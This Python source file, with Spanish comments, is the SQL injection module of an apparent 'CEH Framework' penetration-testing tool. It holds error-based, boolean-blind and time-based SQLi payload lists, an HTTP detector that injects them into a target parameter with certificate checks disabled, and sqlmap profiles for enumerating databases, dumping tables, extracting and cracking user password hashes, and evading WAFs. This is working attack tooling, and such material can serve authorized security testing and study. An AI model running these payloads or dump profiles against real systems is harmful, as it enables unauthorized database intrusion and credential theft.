"""
modules/vuln/sqli.py — Módulo de SQL Injection
CEH Framework

Capas:
  1. Detección manual (Python puro, sin tools externas)
     - Error-based detection
     - Boolean-based blind detection
     - Time-based blind detection
     - Análisis de headers y respuestas
  2. Explotación con SQLMap (si está instalado)
     - 6 perfiles: Detect, Enumerate DBs, Dump Tables, Full Dump, WAF Bypass, Custom
"""
import re
import time
import urllib.request
import urllib.parse
import urllib.error
import ssl
from core.utils import (
    run_command, check_tool,
    print_result, print_error, print_info, print_warning, print_success,
    save_report, separator
)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich import box

console = Console()

# ─── Payloads de detección manual ─────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "'--",
    "'#",
    "' OR '1'='1",
    "' OR 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1; SELECT SLEEP(0)--",
]

BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1--",  "' OR 1=2--"),
    ("1 OR 1=1",    "1 OR 1=2"),
    ("true",        "false"),
]

TIME_PAYLOADS = [
    "'; SELECT SLEEP(4)--",
    "' AND SLEEP(4)--",
    "1; WAITFOR DELAY '0:0:4'--",       # MSSQL
    "'; SELECT pg_sleep(4)--",           # PostgreSQL
    "' AND 1=1 AND SLEEP(4)--",
    "' OR SLEEP(4)--",
]

# Patrones de error SQL conocidos por motor
DB_ERROR_PATTERNS = {
    "MySQL":      [r"you have an error in your sql syntax",
                   r"warning: mysql",
                   r"mysql_fetch",
                   r"mysql_num_rows",
                   r"supplied argument is not a valid mysql"],
    "PostgreSQL": [r"pg_query\(\)",
                   r"pg_exec\(\)",
                   r"postgresql.*error",
                   r"syntax error at or near",
                   r"unterminated quoted string"],
    "MSSQL":      [r"microsoft sql server",
                   r"odbc sql server",
                   r"syntax error converting",
                   r"unclosed quotation mark"],
    "Oracle":     [r"ora-\d{5}",
                   r"oracle error",
                   r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite_master",
                   r"sqlite3\.operationalerror",
                   r"no such table"],
    "Generic":    [r"sql syntax",
                   r"sql error",
                   r"database error",
                   r"invalid query",
                   r"unexpected token"],
}

# ─── HTTP Helper ──────────────────────────────────────────────────────────────

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode    = ssl.CERT_NONE

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,*/*",
}

def _http_get(url: str, timeout: int = 10) -> tuple[str, int, dict]:
    """GET simple. Retorna (body, status_code, headers)."""
    try:
        req = urllib.request.Request(url, headers=HEADERS)
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as r:
            body = r.read().decode("utf-8", errors="replace")
            return body, r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return body, e.code, {}
    except Exception:
        return "", 0, {}


def _http_post(url: str, data: dict, timeout: int = 10) -> tuple[str, int]:
    """POST con datos form-encoded."""
    try:
        encoded = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=encoded, headers={
            **HEADERS,
            "Content-Type": "application/x-www-form-urlencoded",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as r:
            return r.read().decode("utf-8", errors="replace"), r.status
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", errors="replace"), e.code
    except Exception:
        return "", 0


# ─── Motor de detección manual ────────────────────────────────────────────────

class SQLiDetector:
    def __init__(self, target: str, param: str, method: str = "GET",
                 post_data: dict = None, cookie: str = None):
        self.target    = target
        self.param     = param
        self.method    = method.upper()
        self.post_data = post_data or {}
        self.cookie    = cookie
        self.findings: list[dict] = []

    # ── Helpers internos ──────────────────────────────────────────────────────
    def _inject_url(self, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[self.param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _inject_post(self, payload: str) -> dict:
        data = dict(self.post_data)
        data[self.param] = payload
        return data

    def _fetch(self, payload: str) -> tuple[str, int]:
        if self.method == "POST":
            return _http_post(self.target, self._inject_post(payload))
        else:
            body, code, _ = _http_get(self._inject_url(payload))
            return body, code

    def _detect_db_engine(self, body: str) -> str | None:
        body_lower = body.lower()
        for engine, patterns in DB_ERROR_PATTERNS.items():
            for p in patterns:
                if re.search(p, body_lower):
                    return engine
        return None

    def _record(self, vuln_type: str, payload: str, evidence: str, engine: str = None):
        self.findings.append({
            "type":    vuln_type,
            "payload": payload,
            "evidence": evidence[:300],
            "engine":  engine or "Desconocido",
        })

    # ── Técnicas de detección ─────────────────────────────────────────────────
    def detect_error_based(self) -> list[dict]:
        """Detección basada en mensajes de error SQL."""
        found = []
        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Error-based[/cyan] {task.description}"),
            BarColumn(bar_width=24),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as prog:
            task = prog.add_task("probando payloads...", total=len(ERROR_PAYLOADS))
            for payload in ERROR_PAYLOADS:
                body, code = self._fetch(payload)
                engine = self._detect_db_engine(body)
                if engine:
                    ev = self._extract_error_snippet(body)
                    self._record("Error-Based SQLi", payload, ev, engine)
                    found.append({"payload": payload, "engine": engine, "evidence": ev})
                prog.advance(task)
        return found

    def detect_boolean_blind(self) -> list[dict]:
        """Detección boolean-based blind (diferencia de respuesta TRUE vs FALSE)."""
        found = []
        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Boolean-blind[/cyan] {task.description}"),
            BarColumn(bar_width=24),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as prog:
            task = prog.add_task("comparando respuestas...", total=len(BOOLEAN_PAIRS))
            for true_pl, false_pl in BOOLEAN_PAIRS:
                body_true,  code_true  = self._fetch(true_pl)
                body_false, code_false = self._fetch(false_pl)

                len_diff    = abs(len(body_true) - len(body_false))
                code_diff   = code_true != code_false
                # Umbral: diferencia de >80 chars o status distintos = comportamiento anómalo
                if len_diff > 80 or code_diff:
                    ev = (
                        f"TRUE payload ({true_pl}): {len(body_true)} bytes, HTTP {code_true}\n"
                        f"FALSE payload ({false_pl}): {len(body_false)} bytes, HTTP {code_false}\n"
                        f"Δ bytes: {len_diff}"
                    )
                    self._record("Boolean-Blind SQLi", true_pl, ev)
                    found.append({
                        "true_pl": true_pl, "false_pl": false_pl,
                        "len_diff": len_diff, "code_diff": code_diff,
                    })
                prog.advance(task)
        return found

    def detect_time_based(self, delay: int = 4) -> list[dict]:
        """Detección time-based blind (mide tiempo de respuesta)."""
        found = []
        baseline_start = time.time()
        self._fetch("1")
        baseline = time.time() - baseline_start

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Time-based[/cyan] {task.description}"),
            BarColumn(bar_width=24),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as prog:
            task = prog.add_task(f"esperando delays >{delay}s...", total=len(TIME_PAYLOADS))
            for payload in TIME_PAYLOADS:
                t0 = time.time()
                self._fetch(payload)
                elapsed = time.time() - t0
                if elapsed >= delay * 0.8:   # margen del 20%
                    ev = (
                        f"Tiempo baseline: {baseline:.2f}s\n"
                        f"Tiempo con payload: {elapsed:.2f}s\n"
                        f"Diferencia: +{elapsed - baseline:.2f}s"
                    )
                    self._record("Time-Based Blind SQLi", payload, ev)
                    found.append({
                        "payload": payload,
                        "elapsed": elapsed,
                        "baseline": baseline,
                    })
                prog.advance(task)
        return found

    def _extract_error_snippet(self, body: str) -> str:
        """Extrae el fragmento relevante del mensaje de error."""
        body_lower = body.lower()
        for patterns in DB_ERROR_PATTERNS.values():
            for p in patterns:
                m = re.search(p, body_lower)
                if m:
                    start = max(0, m.start() - 30)
                    end   = min(len(body), m.end() + 150)
                    return body[start:end].strip()
        return body[:200]

    def run_all(self) -> dict:
        """Ejecuta todas las técnicas de detección."""
        return {
            "error_based":    self.detect_error_based(),
            "boolean_blind":  self.detect_boolean_blind(),
            "time_based":     self.detect_time_based(),
            "findings":       self.findings,
        }


# ─── SQLMap profiles ──────────────────────────────────────────────────────────

SQLMAP_PROFILES = {
    "1": {
        "name": "Detección rápida",
        "desc": "Detecta si el parámetro es vulnerable (sin explotar)",
        "icon": "🔍",
        "flags": ["--batch", "--level=1", "--risk=1", "--smart"],
    },
    "2": {
        "name": "Enumerar bases de datos",
        "desc": "Lista todos los schemas/databases del servidor",
        "icon": "🗄️",
        "flags": ["--batch", "--level=2", "--dbs"],
    },
    "3": {
        "name": "Enumerar tablas",
        "desc": "Lista tablas de la DB seleccionada",
        "icon": "📋",
        "flags": ["--batch", "--level=2", "--tables"],
        "extra_prompt": {"flag": "-D", "label": "Nombre de la base de datos"},
    },
    "4": {
        "name": "Dump de tabla",
        "desc": "Extrae el contenido completo de una tabla",
        "icon": "💾",
        "flags": ["--batch", "--level=3", "--dump"],
        "extra_prompt": {
            "flag_db":    "-D",
            "label_db":   "Base de datos",
            "flag_table": "-T",
            "label_table":"Tabla a dumpear",
        },
    },
    "5": {
        "name": "Full Dump + credenciales",
        "desc": "Dump completo + crack de hashes de usuarios",
        "icon": "🔑",
        "flags": ["--batch", "--level=3", "--risk=2",
                  "--dump-all", "--users", "--passwords", "--exclude-sysdbs"],
    },
    "6": {
        "name": "WAF Bypass",
        "desc": "Evasión de WAF con tampers y agente aleatorio",
        "icon": "🥷",
        "flags": [
            "--batch", "--level=4", "--risk=3",
            "--tamper=space2comment,between,randomcase,charencode",
            "--random-agent", "--delay=1", "--retries=3",
        ],
    },
    "7": {
        "name": "Personalizado",
        "desc": "Define tus propios flags de sqlmap",
        "icon": "🔧",
        "flags": [],
    },
}

# ─── Helpers de UI ────────────────────────────────────────────────────────────

def _show_profiles():
    table = Table(
        title="Perfiles SQLMap",
        box=box.ROUNDED,
        border_style="yellow"
    )
    table.add_column("Opción", style="bold yellow", justify="center", width=8)
    table.add_column("Perfil",  style="bold white",  width=26)
    table.add_column("Descripción", style="dim white")
    for k, p in SQLMAP_PROFILES.items():
        table.add_row(f"[{k}]", f"{p['icon']} {p['name']}", p['desc'])
    console.print(table)


def _render_findings(results: dict, target: str, param: str):
    """Muestra un resumen visual de los hallazgos de detección manual."""
    findings = results["findings"]

    if not findings:
        console.print(Panel(
            "[bold green]✔ No se detectaron indicadores de SQL Injection[/bold green]\n"
            "[dim]Esto no garantiza que el target sea seguro.\n"
            "Considera usar SQLMap con nivel más alto o revisar otros parámetros.[/dim]",
            border_style="green",
            box=box.ROUNDED,
        ))
        return

    # Tabla de hallazgos
    table = Table(
        title=f"⚠  Vulnerabilidades detectadas — {target} [{param}]",
        box=box.DOUBLE_EDGE,
        border_style="red",
        header_style="bold red",
    )
    table.add_column("Técnica",  style="bold white",  width=22)
    table.add_column("Motor DB", style="bold yellow",  width=14)
    table.add_column("Payload",  style="cyan",         width=26)
    table.add_column("Evidencia", style="dim white")

    for f in findings:
        table.add_row(
            f["type"],
            f["engine"],
            f["payload"][:24] + ("…" if len(f["payload"]) > 24 else ""),
            f["evidence"][:80].replace("\n", " "),
        )
    console.print(table)

    # Resumen por técnica
    tipos = {}
    for f in findings:
        tipos[f["type"]] = tipos.get(f["type"], 0) + 1

    lines = ["[bold red]RESUMEN DE HALLAZGOS[/bold red]\n"]
    for tipo, count in tipos.items():
        lines.append(f"  [red]•[/red] {tipo}: [bold]{count}[/bold] payload(s) confirmado(s)")

    engines = {f["engine"] for f in findings if f["engine"] != "Desconocido"}
    if engines:
        lines.append(f"\n  [bold cyan]Motor detectado:[/bold cyan] {', '.join(engines)}")

    lines.append("\n  [bold yellow]Recomendación:[/bold yellow] Usar perfil SQLMap para explotar.")

    console.print(Panel("\n".join(lines), border_style="red", box=box.ROUNDED))


def _build_sqlmap_cmd(target: str, param: str, profile: dict,
                      method: str, cookie: str, extra: dict) -> list[str]:
    """Construye el comando sqlmap completo."""
    cmd = ["sqlmap", "-u", target, "-p", param, "--method", method]

    if cookie:
        cmd += ["--cookie", cookie]

    cmd += profile["flags"]

    # Flags extra según perfil
    ep = profile.get("extra_prompt", {})
    if "flag" in ep and extra.get("db"):
        cmd += [ep["flag"], extra["db"]]
    if "flag_db" in ep and extra.get("db"):
        cmd += [ep["flag_db"], extra["db"]]
    if "flag_table" in ep and extra.get("table"):
        cmd += [ep["flag_table"], extra["table"]]

    # Output dir
    cmd += ["--output-dir", "/tmp/sqlmap_ceh"]

    return cmd


# ─── Entrypoints del módulo ───────────────────────────────────────────────────

def run_manual_detection(target: str, param: str, method: str = "GET",
                         post_data: dict = None, cookie: str = None) -> dict:
    """
    Ejecuta detección manual completa (Error-Based, Boolean-Blind, Time-Based).
    No requiere herramientas externas.
    """
    console.print(f"\n[bold cyan]╔══ DETECCIÓN MANUAL SQLi ══╗[/bold cyan]")
    separator()
    print_info(f"Target: [bold]{target}[/bold]")
    print_info(f"Parámetro: [bold]{param}[/bold]  Método: [bold]{method}[/bold]")
    print_warning("Ejecutando 3 técnicas de detección. Puede tardar ~30s...\n")

    detector = SQLiDetector(target, param, method, post_data, cookie)
    results  = detector.run_all()

    separator()
    _render_findings(results, target, param)

    # Guardar reporte
    report_lines = [f"Target: {target}\nParámetro: {param}\nMétodo: {method}\n\n"]
    for f in results["findings"]:
        report_lines.append(
            f"[{f['type']}]\n"
            f"  Motor:   {f['engine']}\n"
            f"  Payload: {f['payload']}\n"
            f"  Evidencia:\n    {f['evidence']}\n"
        )
    report_content = "\n".join(report_lines) if results["findings"] else "Sin hallazgos."
    rf = save_report(target, "sqli_manual", report_content)
    print_info(f"Reporte guardado en: [bold]{rf}[/bold]")

    return results


def run_sqlmap(target: str, param: str, method: str = "GET",
               cookie: str = None):
    """
    Explotación con SQLMap — múltiples perfiles.
    """
    if not check_tool("sqlmap"):
        print_error("sqlmap no está instalado.")
        print_info("Instala con:")
        console.print("  [bold]apt install sqlmap[/bold]        # Kali/Parrot/Debian")
        console.print("  [bold]pacman -S sqlmap[/bold]          # Arch/Manjaro")
        console.print("  [bold]pip install sqlmap[/bold]        # pip universal")
        return

    console.print(f"\n[bold yellow]╔══ SQLMAP EXPLOIT ENGINE ══╗[/bold yellow]")
    separator()
    print_info(f"Target: [bold]{target}[/bold]  Param: [bold]{param}[/bold]")
    console.print()

    _show_profiles()
    choice = Prompt.ask(
        "\n[bold yellow]  Selecciona perfil[/bold yellow]",
        choices=list(SQLMAP_PROFILES.keys()),
        default="1"
    )
    profile = SQLMAP_PROFILES[choice]

    # Flags personalizados
    extra = {}
    if profile["name"] == "Personalizado":
        custom = Prompt.ask("  Flags sqlmap adicionales (ej: --dbs --level=3)")
        profile["flags"] = custom.split()

    # Prompts extra según perfil
    ep = profile.get("extra_prompt", {})
    if ep:
        if "label" in ep:
            extra["db"] = Prompt.ask(f"  {ep['label']}")
        if "label_db" in ep:
            extra["db"]    = Prompt.ask(f"  {ep['label_db']}")
            extra["table"] = Prompt.ask(f"  {ep['label_table']}")

    # Cookie adicional
    if not cookie:
        add_cookie = Confirm.ask("  ¿Agregar cookie de sesión?", default=False)
        if add_cookie:
            cookie = Prompt.ask("  Cookie (ej: PHPSESSID=abc123)")

    cmd = _build_sqlmap_cmd(target, param, profile, method, cookie, extra)

    separator()
    print_info(f"Ejecutando: [bold]{' '.join(cmd)}[/bold]")
    print_warning("Esto puede tardar varios minutos...\n")

    stdout, stderr, code = run_command(cmd, timeout=900)
    output = stdout or stderr

    print_result(
        f"SQLMap — {profile['name']} — {target}",
        output,
        style="yellow"
    )

    rf = save_report(target, f"sqlmap_{profile['name'].replace(' ', '_')}", output)
    print_info(f"Reporte guardado en: [bold]{rf}[/bold]")


def run_sqli_module(target: str):
    """
    Punto de entrada principal del módulo SQLi.
    Muestra submenú: Detección manual → SQLMap → Completo.
    """
    console.print("\n[bold yellow]╔══ MÓDULO: SQL INJECTION ══╗[/bold yellow]")
    separator()

    # ── Recolectar parámetros base ──
    print_info(f"Target: [bold]{target}[/bold]")
    console.print()

    param = Prompt.ask("  [bold cyan]Parámetro vulnerable[/bold cyan] (ej: id, user, search)")

    method = Prompt.ask(
        "  [bold cyan]Método HTTP[/bold cyan]",
        choices=["GET", "POST"],
        default="GET"
    )

    post_data = {}
    if method == "POST":
        raw = Prompt.ask(
            "  [bold cyan]Datos POST[/bold cyan] (CLAVE=VALOR separados por &, ej: user=admin&pass=test)"
        )
        for item in raw.split("&"):
            if "=" in item:
                k, v = item.split("=", 1)
                post_data[k.strip()] = v.strip()

    cookie = None
    if Confirm.ask("  ¿Incluir cookie de sesión?", default=False):
        cookie = Prompt.ask("  Cookie (ej: PHPSESSID=abc123; token=xyz)")

    # ── Submenú de acción ──
    separator()
    console.print()

    SQLI_ACTIONS = {
        "1": ("🔎 Detección manual (sin dependencias)",  "manual"),
        "2": ("💣 Explotación con SQLMap",               "sqlmap"),
        "3": ("🚀 Completo (Detección → SQLMap)",        "full"),
        "0": ("⬅  Volver",                               "back"),
    }

    action_table = Table(
        title="Acciones SQLi",
        box=box.ROUNDED,
        border_style="yellow",
        show_header=False,
    )
    action_table.add_column("Opción", style="bold yellow", width=6)
    action_table.add_column("Acción", style="white")
    for k, (label, _) in SQLI_ACTIONS.items():
        action_table.add_row(f"[{k}]", label)
    console.print(action_table)

    action = Prompt.ask(
        "\n[bold yellow]  Selecciona acción[/bold yellow]",
        choices=list(SQLI_ACTIONS.keys()),
        default="1"
    )
    chosen = SQLI_ACTIONS[action][1]

    if chosen == "back":
        return

    separator()

    if chosen in ("manual", "full"):
        results = run_manual_detection(target, param, method, post_data, cookie)

        if chosen == "full":
            separator()
            if results["findings"]:
                print_success("Vulnerabilidad detectada — lanzando SQLMap...")
                console.print()
                run_sqlmap(target, param, method, cookie)
            else:
                print_warning("No se confirmaron hallazgos en detección manual.")
                if Confirm.ask("  ¿Ejecutar SQLMap de todas formas?", default=False):
                    run_sqlmap(target, param, method, cookie)

    elif chosen == "sqlmap":
        run_sqlmap(target, param, method, cookie)

    console.print("\n[bold green]✔ Módulo SQL Injection finalizado.[/bold green]")